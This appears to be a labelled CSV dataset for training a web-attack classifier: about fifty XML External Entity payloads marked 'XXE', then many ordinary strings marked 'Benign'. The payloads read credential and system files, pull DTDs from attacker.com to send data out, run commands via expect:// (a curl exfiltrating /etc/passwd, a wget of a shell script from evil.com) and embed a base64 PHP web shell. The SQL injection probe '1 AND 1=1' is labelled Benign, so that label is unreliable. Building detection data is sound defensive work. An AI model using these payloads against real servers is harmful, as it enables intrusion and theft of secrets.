"text","label"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.xml'>%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://ls'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///root/.bash_history'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/passwd'><!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;%local;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://cat /etc/passwd'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/cmdline'>]><test>&xxe;</test>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/fd/0'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aXXE%250d%250a.%250d%250aQUIT%250d%250a'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'jar:file:///var/www/html/upload.zip!/shell.php'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/win.ini'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'netdoc:/etc/passwd'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/issue'>]><root>&xxe;</root>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/www/html/index.php'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///usr/local/apache2/conf/httpd.conf'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///opt/tomcat/conf/server.xml'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///var/log/nginx/error.log'><!ENTITY % dtd SYSTEM 'http://attacker.com/log.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://nc -lvvp 4444'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/net/tcp'>]><test>&xxe;</test>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///sys/class/net/eth0/address'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://input'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/shadow'><!ENTITY % remote SYSTEM 'http://attacker.com/exfil.dtd'>%remote;%local;%send;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://wget http://evil.com/shell.sh -O /tmp/s.sh'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/user/.bashrc'>]><root>&xxe;</root>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///opt/app/config/database.yml'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/lib/mysql/my.cnf'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/mysql/my.cnf'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///app/config/secrets.yml'><!ENTITY % dtd SYSTEM 'http://attacker.com/steal.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/status'>]><test>&xxe;</test>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/maps'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'ftp://attacker.com:21/xxe.txt'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'dict://attacker.com:11211/stats'>]><data>&file;</data>","XXE"
"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system.ini'>]><root>&xxe;</root>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/tasks/at.exe'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/system'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/pagefile.sys'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/repair/sam'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/boot.ini'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///c:/autoexec.bat'>]><test>&xxe;</test>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/config.sys'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/resolv.conf'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts.allow'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/hosts.deny'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/crontab'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/fstab'>]><root>&xxe;</root>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/group'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/gshadow'>]><foo>&xxe;</foo>","XXE"
"admin","Benign"
"password123","Benign"
"/index.php","Benign"
"search.php?query=test","Benign"
"John Doe","Benign"
"About Us","Benign"
"contact.html","Benign"
"login.php","Benign"
"my_username","Benign"
"1 AND 1=1","Benign"
"category=electronics","Benign"
"home","Benign"
"products","Benign"
"about-us","Benign"
"contact-us","Benign"
"services","Benign"
"blog","Benign"
"news","Benign"
"faq","Benign"
"help","Benign"
"support","Benign"
"login","Benign"
"register","Benign"
"signup","Benign"
"profile","Benign"
"dashboard","Benign"
"settings","Benign"
"account","Benign"
"cart","Benign"
"checkout","Benign"
"payment","Benign"
"search","Benign"
"results","Benign"
"category","Benign"
"product-details","Benign"
"user-guide","Benign"
"documentation","Benign"
"api-docs","Benign"
"terms","Benign"
"privacy","Benign"
"cookies","Benign"
"sitemap","Benign"
"404","Benign"
"error","Benign"
"test","Benign"
"demo","Benign"
"sample","Benign"
"example","Benign"
"index.html","Benign"
"page.php","Benign"
"view.asp","Benign"
"default.jsp","Benign"
"main.py","Benign"
"app.js","Benign"
"style.css","Benign"
"image.jpg","Benign"
"file.pdf","Benign"
"document.docx","Benign"
"data.json","Benign"
"config.xml","Benign"
"readme.md","Benign"
"username123","Benign"
"password","Benign"
"email@example.com","Benign"
"123-456-7890","Benign"
"New York","Benign"
"Product Name","Benign"
"Description here","Benign"
"Click here","Benign"
"Learn more","Benign"
"Buy now","Benign"
"Add to cart","Benign"
"Submit","Benign"
"Cancel","Benign"
"Save","Benign"
"Delete","Benign"
"Edit","Benign"
"View","Benign"
"Download","Benign"
"Upload","Benign"
"Share","Benign"
"Like","Benign"
"Comment","Benign"
"Follow","Benign"
"Unfollow","Benign"
"Subscribe","Benign"
"Unsubscribe","Benign"
"Hello World","Benign"
"Welcome","Benign"
"Thank you","Benign"
"Goodbye","Benign"
"Yes","Benign"
"No","Benign"
"Maybe","Benign"
"OK","Benign"
"localhost","Benign"
"127.0.0.1","Benign"
"192.168.1.1","Benign"
"google.com","Benign"
"8.8.8.8","Benign"
"/products/view?id=1024&category=books","Benign"
"/search?q=hello+world&sort=desc","Benign"
"/api/v1/user/profile?uid=5912","Benign"
"/login?redirect=/dashboard","Benign"
"/bbs/board.php?bo_table=free&wr_id=10","Benign"
"email=support@shieldhub.com","Benign"
"date=2025-11-14","Benign"
"price=1,000,000","Benign"
"comment=This+is+great!","Benign"
"refer=https://google.com","Benign"
"user_agent=Mozilla/5.0","Benign"
"path=/usr/local/bin (docs)","Benign"
"1+1=2","Benign"
"admin_page","Benign"
"sub_title=Hello&World","Benign"
"msg=alert(message)","Benign"
"desc=10% discount","Benign"
"file=report.pdf","Benign"
"javascript:void(0)","Benign"
"javascript:history.back()","Benign"
"<img src='logo.png'>","Benign"
"<b>Bold Text</b>","Benign"
"<i>Italic</i>","Benign"
"width=100%","Benign"
"height=50px","Benign"
"x=10&y=20","Benign"
"kor=안녕하세요","Benign"
"eng=Hello","Benign"
"%00","Benign"
"%20","Benign"
